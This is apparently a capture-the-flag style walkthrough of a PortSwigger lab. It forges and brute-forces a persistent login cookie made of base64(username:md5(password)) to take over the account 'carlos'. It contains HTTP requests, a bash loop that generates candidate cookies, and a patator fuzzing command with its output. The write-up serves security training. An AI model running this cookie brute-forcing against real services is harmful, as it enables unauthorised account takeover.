# [Lab 10: Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)

## Description

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.

-   Your credentials: `wiener:peter`
-   Victim's username: `carlos`
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

---

## Solution

Navigate to the login page and submit a request with the credentials `wiener:peter` and make sure to check the "Stay logged in" checkbox.

```http
POST /login HTTP/1.1
Host: ac331f431eba0b3b80f5dba6001e00e1.web-security-academy.net
Cookie: session=7Uy8bFg7LS0U6kBfxLKY1YlT3a4NFuPj
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: https://ac331f431eba0b3b80f5dba6001e00e1.web-security-academy.net
Dnt: 1
Referer: https://ac331f431eba0b3b80f5dba6001e00e1.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=wiener&password=peter&stay-logged-in=on
```

The response is a 302 redirect to `/my-account` that sets two cookies: `session` and `stay-logged-in`.

```http
HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=eJVoSIYV28q2mNuNwbir0RyU1PhUn6P9; Secure; HttpOnly; SameSite=None
Connection: close
Content-Length: 0
```

Following the redirect with both cookies set yields authenticated access to `wiener`'s account, as expected. Following the redirect with just the `stay-logged-in` cookie *also* yields authenticated access to `wiener`'s account, and the same is true if just the `session` cookie is present. This is good news, as it indicates that it is possible to authenticate to an account with just the `stay-logged-in` cookie. If this cookie can be reproduced for a different account, it will grant access to that account.

Determine the composition of the `stay-logged-in` cookie. It appears to be base64-encoded, so base64-decode it.

![](images/Pasted%20image%2020210812114528.png)

This yields the string `wiener:51dc30ddc473d43a6011e9ebba6ca770`. The first part of the string is the username and the second part of the string appears to be some sort of hash. 32 characters indicates it is probably an MD5 hash, but use [Name That Hash](https://nth.skerritt.blog/) to be sure.

![](images/Pasted%20image%2020210812114758.png)

The top choice is MD5, as thought. Confirm that the MD5 of `peter` is `51dc30ddc473d43a6011e9ebba6ca770`.

```bash
$ echo -n peter | md5sum

51dc30ddc473d43a6011e9ebba6ca770 -
```

It is. Thus, the algorithm for generating the persistent login cookie is:

```txt
base64(username + ':' + md5(password))
```

Generate a file of all the possible cookies based on the given password list.

```bash
for password in $(cat passwords.txt); do hash=$(echo -n $password | md5sum | cut -d' ' -f1); echo "carlos:$hash" | tr -d '\n' | base64 >> cookies.txt; done
```

Submit a request for `/my-account` with an incorrect persistent login cookie and no `session` cookie.

```http
GET /my-account HTTP/1.1
Host: ac8c1f9e1efaffdc80dde865004800de.web-security-academy.net
Cookie: stay-logged-in=blah
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: https://ac8c1f9e1efaffdc80dde865004800de.web-security-academy.net
Dnt: 1
Referer: https://ac8c1f9e1efaffdc80dde865004800de.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

It results in a 302 redirect back to `/login`. The 302 error code is the indication that can be used during the brute force to ignore failed requests.

Attempt a light brute force of the persistent login cookie using BurpSuite Intruder to detect the presence of any kind of brute force protection.

![](images/Pasted%20image%2020210812120855.png)

All 11 requests resulted in the same 302 redirect to `/login`, indicating there dosn't seem to be any kind of brute force protection.

Brute force `carlos`'s persistent login cookie.

```bash
$ patator http_fuzz url=https://ac8c1f9e1efaffdc80dde865004800de.web-security-academy.net/my-account method=GET header='Cookie: stay-logged-in=FILE0; Expires=Wed, 01 Jan 3000 01:00:00 UTC' 0=cookies.txt -x ignore:code=302

11:24:08 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-12 11:24 CDT
11:24:08 patator    INFO -
11:24:08 patator    INFO - code size:clen       time | candidate                          |   num | mesg
11:24:08 patator    INFO - -----------------------------------------------------------------------------
11:24:12 patator    INFO - 200  5375:5147      2.767 | Y2FybG9zOjk2ZTc5MjE4OTY1ZWI3MmM5MmE1NDlkZDVhMzMwMTEy |     8 | HTTP/2 200 
11:24:17 patator    INFO - Hits/Done/Skip/Fail/Size: 1/100/0/0/100, Avg: 11 r/s, Time: 0h 0m 9s
```

The correct persistent login cookie is `Y2FybG9zOjk2ZTc5MjE4OTY1ZWI3MmM5MmE1NDlkZDVhMzMwMTEy`. Use it to access `carlos`'s account and complete the challenge.

Alternatively, base64-decoding the cookie yields the string `carlos:96e79218965eb72c92a549dd5a330112`. A quick Google search of "96e79218965eb72c92a549dd5a330112" yields the password `111111` from [md5hashing.net](https://md5hashing.net/hash/md5/96e79218965eb72c92a549dd5a330112). Logging in with the credentials `carlos:111111` will also complete the challenge.
